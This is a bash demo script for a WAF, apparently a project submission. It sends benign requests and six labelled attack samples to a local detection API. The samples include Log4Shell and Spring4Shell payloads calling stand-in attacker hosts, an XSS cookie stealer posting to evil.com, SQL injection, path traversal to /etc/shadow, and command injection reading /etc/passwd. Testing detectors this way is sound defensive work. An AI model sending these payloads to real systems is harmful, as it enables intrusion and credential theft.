#!/usr/bin/env bash
# ==============================================================================
# Sentinel WAF — Live Demonstration Script
# Problem Statement 25172: Transformer-Based End-to-End WAF Pipeline
# ==============================================================================

set -e

# The README quick start uses 8080. Override with WAF_PORT / API_URL for Docker
# (where nginx exposes the protected app and the API lives behind /api).
DEFAULT_PORT="${WAF_PORT:-8080}"
API_URL="${API_URL:-http://localhost:${DEFAULT_PORT}}"
API_KEY="${API_KEY:-waf-key-dev-001}"

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}====================================================================${NC}"
echo -e "${CYAN}🛡️   SENTINEL WAF — TRANSFORMER ZERO-DAY INTERCEPTION DEMO          ${NC}"
echo -e "${CYAN}====================================================================${NC}"
echo -e "Target API: ${BLUE}${API_URL}${NC}"
echo -e "Dashboard : ${YELLOW}${API_URL}/history${NC}\n"

send_request() {
    local type="$1"
    local name="$2"
    local method="$3"
    local path="$4"
    local headers_json="$5"
    local body_str="$6"

    # Use python to safely construct JSON payload and call API
    python3 -c "
import urllib.request, json, sys

api_url = '${API_URL}'
api_key = '${API_KEY}'

req_data = {
    'method': '''${method}''',
    'path': '''${path}''',
    'headers': json.loads('''${headers_json}'''),
    'body': '''${body_str}'''
}

req = urllib.request.Request(
    f'{api_url}/detect',
    data=json.dumps(req_data).encode('utf-8'),
    headers={'Content-Type': 'application/json', 'X-API-Key': api_key},
    method='POST'
)

with urllib.request.urlopen(req) as resp:
    res = json.loads(resp.read().decode('utf-8'))
    is_anomaly = res.get('is_anomaly', False)
    reason = res.get('reason', '')
    score = f\"{res.get('anomaly_score', 0.0):.4f}\"
    latency = f\"{res.get('latency_ms', 0.0):.1f}\"

    status = '\033[0;31m🚫 BLOCKED (Threat)\033[0m' if is_anomaly else '\033[0;32m✅ ALLOWED (Clean)\033[0m'
    type_str = '''${type}'''
    name_str = '''${name}'''
    method_str = '''${method}'''
    path_str = '''${path}'''[:28]

    print(f'[{type_str:<6}] {name_str:<32} | {method_str:<4} {path_str:<28} | Score: {score:<6} | {status} ({latency}ms) {reason}')
"
    sleep 0.15
}

echo -e "${GREEN}>>> 1. SENDING BENIGN TRAFFIC SAMPLES...${NC}"
send_request "BENIGN" "Product Search (Gadgets)"   "GET" "/search?q=smart+watch&cat=electronics" '{"Host":"example.com","User-Agent":"Mozilla/5.0"}' ""
send_request "BENIGN" "Product Search (Audio)"     "GET" "/search?q=wireless+headphones&page=1" '{"Host":"example.com","User-Agent":"Mozilla/5.0"}' ""
send_request "BENIGN" "Category Catalog Filter"    "GET" "/api/v1/products/view?category=books&sort=desc" '{"Host":"example.com","User-Agent":"Mozilla/5.0"}' ""
send_request "BENIGN" "Help Desk & FAQ Portal"     "GET" "/faq?topic=pricing&ref=nav" '{"Host":"example.com","User-Agent":"Mozilla/5.0"}' ""
send_request "BENIGN" "Knowledge Base Article"     "GET" "/articles/2026/how-waf-works" '{"Host":"example.com","User-Agent":"Mozilla/5.0"}' ""

echo -e "\n${RED}>>> 2. SENDING REAL-WORLD ATTACKS & ZERO-DAY EXPLOITS...${NC}"
send_request "ATTACK" "Log4Shell CVE-2021-44228" "POST" "/api/v1/auth/login" '{"User-Agent":"${jndi:ldap://attacker-c2.com:1389/Exploit}"}' '{"user":"root"}'
send_request "ATTACK" "SQL Injection (Union Select)" "GET" "/items?id=101%20UNION%20SELECT%20null,password,3%20FROM%20users--" "{}" ""
send_request "ATTACK" "Path Traversal (etc/shadow)" "GET" "/files/download?file=../../../../../../etc/shadow" "{}" ""
send_request "ATTACK" "Stored XSS Script Stealer" "POST" "/api/forum/post" '{"Content-Type":"application/json"}' '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>'
send_request "ATTACK" "Spring4Shell ClassLoader RCE" "POST" "/helloworld" '{"class.module.classLoader.URLs[0]":"jar:http://attacker.com/shell.war!/"}' 'action=upload'
send_request "ATTACK" "OS Command Injection" "GET" "/network/ping?host=127.0.0.1;cat%20/etc/passwd" "{}" ""

echo -e "\n${CYAN}====================================================================${NC}"
echo -e "${GREEN}✨ Demo complete! Check live interactive graphs at: ${YELLOW}${API_URL}/history${NC}"
echo -e "${CYAN}====================================================================${NC}"
